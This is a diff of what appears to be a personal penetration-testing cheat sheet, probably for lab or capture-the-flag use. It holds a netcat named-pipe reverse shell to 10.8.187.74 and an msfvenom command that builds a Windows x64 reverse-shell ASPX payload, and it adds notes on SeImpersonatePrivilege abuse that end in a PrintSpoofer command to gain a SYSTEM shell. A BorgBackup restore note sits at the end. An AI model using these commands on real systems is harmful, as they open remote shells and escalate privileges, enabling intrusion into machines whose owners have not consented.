@@ -405,7 +405,14 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.187.74 9000 >/tmp/f
 # TO INCORPORATE
 
 # Reverse shell on windows 64, aspx file
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.187.74 LPORT=443 -f aspx > relevant.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.187.74 LPORT=9000 -f aspx > relevant.aspx
+
+# Privilege escalation windows
+- list services
+whoami /priv
+- SeImpersonatePrivilege abuse
+https://github.com/dievus/printspoofer
+PrintSpoofer.exe -i -c cmd
 
 #BorgBackup
 extraire une backup : borg extract home/field/dev/final_archive/::<nom>
